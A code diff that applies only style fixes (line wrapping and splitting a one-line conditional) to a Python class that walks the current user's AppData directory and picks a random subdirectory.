@@ -6,9 +6,11 @@ import os
 from random import randint
 from getpass import getuser
 
+
 class Finder(object):
 
-    root_dir = os.path.abspath(os.path.sep) + os.path.sep + 'Users' + os.path.sep + getuser() + os.path.sep + 'AppData'
+    root_dir = os.path.abspath(os.path.sep) + os.path.sep + \
+        'Users' + os.path.sep + getuser() + os.path.sep + 'AppData'
 
     @staticmethod
     def is_bad(root, dirs, files):
@@ -24,7 +26,8 @@ class Finder(object):
     def find(cls):
         paths = []
         for root, dirs, files in os.walk(cls.root_dir, topdown=True):
-            if cls.is_bad(root, dirs, files):continue
+            if cls.is_bad(root, dirs, files):
+                continue
             _dir = cls.choice(dirs)
             if '.' in _dir:
                 continue
